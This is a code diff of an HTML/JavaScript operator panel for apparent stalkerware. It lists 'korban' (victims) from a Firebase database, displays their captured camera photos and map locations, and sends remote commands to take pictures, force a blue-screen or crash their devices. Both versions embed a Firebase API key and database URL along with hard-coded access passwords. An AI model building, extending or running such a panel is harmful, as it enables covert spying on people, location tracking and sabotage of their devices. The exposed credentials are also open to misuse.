@@ -3,234 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>METEOR | ORBIT 4K</title>
+    <title>VOID-OS | EAGLE MAX CONTROL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --dev: #ff00ea; --own: #ffd700; --adm: #00f2ff; --bg: #0a0a0c; --red: #ff4444; }
-        body { 
-            background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0;
-            background-image: url('https://media.tenor.com/7W88p6-7P54AAAAC/anime-girl.gif');
-            background-size: cover; background-attachment: fixed; overflow: hidden;
-        }
-        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: -1; }
-        
-        /* UI Components */
+        :root { --neon: #ff00ea; --cyber: #00f2ff; --bg: #050505; --card: #121212; --danger: #ff4444; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; }
         #login-screen { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .card { background: rgba(255,255,255,0.05); border: 1px solid var(--dev); padding: 25px; border-radius: 15px; width: 300px; text-align: center; box-shadow: 0 0 15px rgba(255, 0, 234, 0.2); }
-        input { background: transparent; border: 1px solid var(--dev); color: #fff; padding: 12px; width: 100%; border-radius: 8px; margin-bottom: 10px; box-sizing: border-box; outline: none; }
-        button { background: var(--dev); color: #000; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
-        button:hover { opacity: 0.8; transform: scale(1.02); }
-        
-        .container { padding: 20px; max-width: 600px; margin: auto; height: 100vh; overflow-y: auto; box-sizing: border-box; padding-bottom: 100px; }
-        .target-item { background: rgba(255,255,255,0.07); border-left: 4px solid var(--adm); padding: 15px; margin-bottom: 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
-        .btn-wipe { background: var(--red); color: white; width: auto; font-size: 10px; padding: 6px 12px; border-radius: 5px; margin: 0; }
-        .btn-wipe-all { background: transparent; border: 2px solid var(--red); color: var(--red); margin-top: 20px; }
-        .btn-wipe-all:hover { background: var(--red); color: white; }
-
-        /* ========================================
-           ANIMASI ORBIT 4K (FULLSCREEN OVERLAY)
-           ======================================== */
-        #orbit-overlay {
-            position: fixed; inset: 0; background: #000; z-index: 9999;
-            display: none; align-items: center; justify-content: center;
-            flex-direction: column; color: var(--adm); font-family: 'Courier New', monospace;
-        }
-        
-        /* Gambar Bumi HD/4K */
-        .earth {
-            width: 300px; height: 300px;
-            background-image: url('https://upload.wikimedia.org/wikipedia/commons/2/22/Earth_Western_Hemisphere_transparent_background.png');
-            background-size: cover; border-radius: 50%;
-            box-shadow: 0 0 50px rgba(0, 242, 255, 0.5);
-            animation: rotateEarth 20s linear infinite;
-            position: relative;
-        }
-
-        /* Satelit Orbit Ungu */
-        .satellite {
-            position: absolute; width: 50px; height: 50px;
-            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/International_Space_Station_after_undocking_of_STS-132.png/800px-International_Space_Station_after_undocking_of_STS-132.png');
-            background-size: cover;
-            top: -100px; left: 50%; transform: translateX(-50%);
-            filter: drop-shadow(0 0 10px var(--dev));
-        }
-
-        /* Sinar Laser dari Bumi ke Satelit */
-        .laser-beam {
-            position: absolute; bottom: 50%; left: 50%;
-            width: 4px; height: 0;
-            background: linear-gradient(to top, var(--adm), var(--dev));
-            transform: translateX(-50%);
-            box-shadow: 0 0 15px var(--dev);
-            opacity: 0;
-        }
-
-        /* Teks Status di bawah Bumi */
-        #orbit-status { margin-top: 30px; font-size: 14px; text-align: center; text-transform: uppercase; letter-spacing: 2px; }
-
-        /* Keyframes Animasi */
-        @keyframes rotateEarth { from { background-position: 0 0; } to { background-position: 100% 0; } }
-        
-        @keyframes shootLaser {
-            0% { height: 0; opacity: 1; bottom: 50%; }
-            50% { height: 120px; opacity: 1; bottom: 50%; }
-            100% { height: 0; opacity: 0; bottom: 100%; }
-        }
-
-        /* Trigger Animasi */
-        .animating .laser-beam { animation: shootLaser 2s ease-in-out infinite; }
+        .login-card { background: var(--card); border: 1px solid var(--neon); padding: 30px; border-radius: 15px; width: 280px; text-align: center; }
+        input { background: transparent; border: 1px solid var(--neon); color: #fff; padding: 12px; width: 100%; border-radius: 8px; margin-bottom: 15px; box-sizing: border-box; text-align: center; }
+        .btn-login { background: var(--neon); color: #000; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
+        .header { text-align: center; padding: 25px; border-bottom: 2px solid var(--neon); background: #111; }
+        .eagle-logo { width: 100px; filter: drop-shadow(0 0 10px var(--neon)); animation: float 3s infinite; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        .container { padding: 20px; max-width: 1000px; margin: auto; display: grid; grid-template-columns: 1fr; gap: 20px; }
+        @media(min-width: 768px) { .container { grid-template-columns: 320px 1fr; } }
+        .card { background: var(--card); border: 1px solid #333; border-radius: 12px; padding: 20px; }
+        .target-item { padding: 15px; border: 1px solid #222; margin-bottom: 10px; border-radius: 8px; cursor: pointer; display: flex; justify-content: space-between; background: #181818; }
+        .target-item.active { border-color: var(--cyber); background: rgba(0, 242, 255, 0.1); }
+        .control-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .btn { padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 10px; }
+        .btn-snap { background: var(--cyber); }
+        .btn-track { background: #fff; }
+        .btn-bsod { background: #0078d7; color: #fff; }
+        .btn-crash { background: var(--danger); color: #fff; }
+        #preview-img { width: 100%; border-radius: 8px; border: 1px solid var(--cyber); margin-top: 15px; display: none; }
+        #log { background: #000; padding: 10px; border-radius: 5px; height: 80px; overflow-y: auto; font-family: monospace; font-size: 10px; color: #0f0; margin-top: 15px; }
     </style>
 </head>
 <body onload="checkAuth()">
-    <div class="overlay"></div>
-
-    <div id="orbit-overlay">
-        <div class="earth animating">
-            <div class="satellite"></div>
-            <div class="laser-beam"></div>
-        </div>
-        <div id="orbit-status">
-            [SYS]: ESTABLISHING 4K UPLINK...<br>
-            <span style="color:white; font-size:10px;">RECEIVING GPS DATA FROM SATELLITE</span>
-        </div>
-    </div>
-
     <div id="login-screen">
-        <div class="card">
-            <h2 style="color:var(--dev); letter-spacing:2px;">METEOR LOGIN</h2>
-            <input type="password" id="pass" placeholder="ACCESS KEY">
-            <button onclick="login()">IGNITE ACCESS</button>
+        <div class="login-card">
+            <h2 style="color:var(--neon); margin-bottom:20px;">EAGLE LOGIN</h2>
+            <input type="password" id="passkey" placeholder="SECRET ACCESS KEY">
+            <button class="btn-login" onclick="login()">IGNITE SYSTEM</button>
         </div>
     </div>
-
+    <div class="header">
+        <img src="https://i.ibb.co/vz0q8gL/robot-eagle.png" class="eagle-logo">
+        <h2 style="margin:5px 0; color:var(--neon); letter-spacing:3px;">VOID-OS MAX</h2>
+        <div style="font-size:10px; opacity:0.5;">LEAD DEV: KALZ</div>
+        <button onclick="wipe()" style="background:var(--danger); border:none; padding:5px; border-radius:4px; font-size:9px; color:#fff; cursor:pointer; margin-top:10px;">LOGOUT & WIPE</button>
+    </div>
     <div class="container">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 15px;">
-            <h3 style="color: var(--dev); margin:0;">🛰️ RADAR DASHBOARD</h3>
-            <div id="u-info" style="font-size: 11px; opacity:0.8;"></div>
+        <div class="card">
+            <h4 style="color:var(--cyber);">📡 SATELLITE RADAR</h4>
+            <div id="target-list">Scanning...</div>
         </div>
-        
-        <div id="node-list">Scanning...</div>
-
-        <div id="global-wipe" style="display:none; text-align:center;">
-            <button class="btn-wipe-all" onclick="wipeAll()">⚠️ WIPE ALL SIGNALS (RESET)</button>
-        </div>
-
-        <div id="control-box" style="margin-top:20px; display:none;">
-            <div class="card" style="width:100%; text-align:left; border-color:var(--adm); box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);">
-                <h4 id="target-title" style="margin:0 0 15px 0; color:var(--adm);">CONTROL</h4>
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
-                    <button onclick="exec('TAKE')">📸 SNAP FOTO</button>
-                    <button style="background:white; color:black;" onclick="triggerOrbitAnimation()">🌍 TRACK LOKASI (4K)</button>
-                </div>
-                <div id="feed" style="margin-top:15px; min-height: 50px; text-align:center;"></div>
+        <div class="card" id="control-panel" style="display:none;">
+            <h3 id="target-id" style="margin:0; color:var(--neon);">NODE: NONE</h3>
+            <div id="log">Link standby...</div>
+            <div class="control-grid">
+                <button class="btn btn-snap" onclick="send('TAKE')">📸 SNAP</button>
+                <button class="btn btn-track" onclick="track()">🌍 TRACK</button>
+                <button class="btn btn-bsod" onclick="send('BSOD')">🌀 BSOD</button>
+                <button class="btn btn-crash" onclick="send('CRASH')">💀 CRASH</button>
             </div>
-        </div>
-
-        <div id="mgmt-panel" style="margin-top:40px; display:none; border-top: 1px solid rgba(255, 0, 234, 0.3); padding-top:20px;">
-            <h4 style="color: var(--own); margin:0 0 15px 0;">🛡️ USER MANAGEMENT</h4>
-            <div id="mgmt-tools"></div>
+            <img id="preview-img" src="">
         </div>
     </div>
-
 <script>
-    // --- FIREBASE CONFIG (SAMA DENGAN SEBELUMNYA) ---
-    const config = { 
-        apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", 
-        databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" 
-    };
+    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
     firebase.initializeApp(config); const db = firebase.database();
-    let user = null; let activeTarget = null; let currentMaps = "";
-
-    function login() {
-        const k = document.getElementById('pass').value;
-        if(k === "dev111") saveSession({ n: "Kalz", r: "DEVELOPER", p: 100 });
-        else db.ref('users/' + k).once('value', s => { if(s.exists()) saveSession(s.val()); else alert("KEY NOT FOUND"); });
-    }
-
-    function saveSession(data) { sessionStorage.setItem('meteor_v7', JSON.stringify(data)); location.reload(); }
-
-    function checkAuth() {
-        const session = sessionStorage.getItem('meteor_v7');
-        if(session) {
-            user = JSON.parse(session);
-            document.getElementById('login-screen').style.display = 'none';
-            document.getElementById('u-info').innerText = `${user.n} | ${user.r}`;
-            if(user.p > 1) {
-                document.getElementById('mgmt-panel').style.display = 'block';
-                document.getElementById('global-wipe').style.display = 'block';
-                renderMgmt();
-            }
-            startRadar();
-        }
-    }
-
-    function startRadar() {
-        db.ref('korban').on('value', s => {
-            let h = "";
-            s.forEach(c => {
-                h += `<div class="target-item" onclick="viewNode('${c.key}', '${c.val().maps}')">
-                        <span>📍 NODE_${c.key.substring(1,7)}</span>
-                        <button class="btn-wipe" onclick="wipeData('${c.key}')">WIPE</button>
-                      </div>`;
-            });
-            document.getElementById('node-list').innerHTML = h || "No Active Signals.";
-        });
-    }
-
-    function viewNode(id, maps) {
-        activeTarget = id; currentMaps = maps;
-        document.getElementById('control-box').style.display = 'block';
-        document.getElementById('target-title').innerText = `NODE: ${id.substring(1,7)}`;
-        // Scroll ke Control Box
-        document.getElementById('control-box').scrollIntoView({ behavior: 'smooth' });
-        
-        db.ref('hasil_foto/'+id).on('value', f => {
-            const feed = document.getElementById('feed');
-            if(f.val()) feed.innerHTML = `<img src="${f.val().foto}" style="width:100%; border-radius:8px; border:1px solid var(--adm); box-shadow: 0 0 15px rgba(0, 242, 255, 0.3);">`;
-            else feed.innerHTML = "<span style='font-size:10px; opacity:0.5;'>Waiting for photo...</span>";
-        });
-    }
-
-    function exec(a) { db.ref('commands/'+activeTarget).set({ action: a, t: Date.now() }); alert("Signal Pushed!"); }
-
-    // ========================================
-    // FUNGSI LOGIK ANIMASI ORBIT
-    // ========================================
-    function triggerOrbitAnimation() {
-        if(!currentMaps) { alert("No location data yet."); return; }
-        
-        const overlay = document.getElementById('orbit-overlay');
-        const status = document.getElementById('orbit-status');
-        
-        // 1. Tampilkan Overlay
-        overlay.style.display = 'flex';
-        
-        // 2. Sequence Teks Status (Simulasi 4K Scan)
-        setTimeout(() => { status.innerHTML = "[SYS]: SATELLITE LINK ESTABLISHED<br><span style='color:var(--dev);'>PREPARING 4K RESOLUTION SCAN...</span>"; }, 1500);
-        setTimeout(() => { status.innerHTML = "[SYS]: SCANNING TARGET... [99%]<br><span style='color:var(--own);'>DOWNSCALING FROM HD 4K TO MAPS LINK</span>"; }, 3000);
-        
-        // 3. Selesai Animasi (5 Detik), Buka Maps
-        setTimeout(() => {
-            overlay.style.display = 'none';
-            // Kembalikan teks awal
-            status.innerHTML = "[SYS]: ESTABLISHING 4K UPLINK...<br><span style='color:white; font-size:10px;'>RECEIVING GPS DATA FROM SATELLITE</span>";
-            // Buka Google Maps
-            window.open(currentMaps);
-        }, 5000);
-    }
-
-    // --- FUNGSI WIPE & MGMT (SAMA DENGAN v6) ---
-    function wipeData(id) { event.stopPropagation(); if(confirm("Hapus target?")) { db.ref('korban/'+id).remove(); db.ref('hasil_foto/'+id).remove(); db.ref('commands/'+id).remove(); document.getElementById('control-box').style.display = 'none'; } }
-    function wipeAll() { if(confirm("⚠️ WIPE ALL?")) { db.ref('korban').remove(); db.ref('hasil_foto').remove(); db.ref('commands').remove(); document.getElementById('control-box').style.display = 'none'; } }
-    function renderMgmt() {
+    let activeNode = null; let activeMaps = "";
+    function login() { if(document.getElementById('passkey').value === "Secret") { sessionStorage.setItem('auth', 'true'); location.reload(); } else { alert("WRONG KEY"); } }
+    function checkAuth() { if(sessionStorage.getItem('auth')) document.getElementById('login-screen').style.display = 'none'; }
+    db.ref('korban').on('value', snap => {
         let h = "";
-        if(user.r === "DEVELOPER") h += `<button onclick="addUser('OWNER')">+ CREATE OWNER</button>`;
-        if(user.r === "DEVELOPER" || user.r === "OWNER") h += `<button onclick="addUser('ADMIN')">+ CREATE ADMIN</button>`;
-        h += `<button onclick="addUser('MEMBER')">+ CREATE MEMBER</button>`;
-        document.getElementById('mgmt-tools').innerHTML = h;
+        snap.forEach(c => { h += `<div class="target-item" id="n-${c.key}" onclick="select('${c.key}','${c.val().maps}')"><span>📍 NODE_${c.key.substring(1,7)}</span><span style="color:var(--cyber); font-size:10px;">LIVE</span></div>`; });
+        document.getElementById('target-list').innerHTML = h || "Waiting...";
+    });
+    function select(id, maps) {
+        activeNode = id; activeMaps = maps;
+        document.querySelectorAll('.target-item').forEach(e => e.classList.remove('active'));
+        document.getElementById('n-'+id).classList.add('active');
+        document.getElementById('control-panel').style.display = 'block';
+        document.getElementById('target-id').innerText = `NODE: ${id.substring(1,8)}`;
+        db.ref('hasil_foto/'+id).on('value', f => { if(f.val()){ document.getElementById('preview-img').src = f.val().foto; document.getElementById('preview-img').style.display = 'block'; } });
     }
-    function addUser(role) { const n = prompt(`Nama ${role}:`), k = prompt(`Passcode:`); if(n && k) { const p = role === 'OWNER'?3:(role==='ADMIN'?2:1); db.ref('users/'+k).set({ n:n, r:role, p:p }); alert("Account Created!"); } }
+    function send(cmd) { if(activeNode) db.ref('commands/'+activeNode).set({action:cmd, t:Date.now()}); }
+    function track() { if(activeMaps) window.open(activeMaps); }
+    function wipe() { sessionStorage.clear(); location.reload(); }
 </script>
 </body>
 </html>
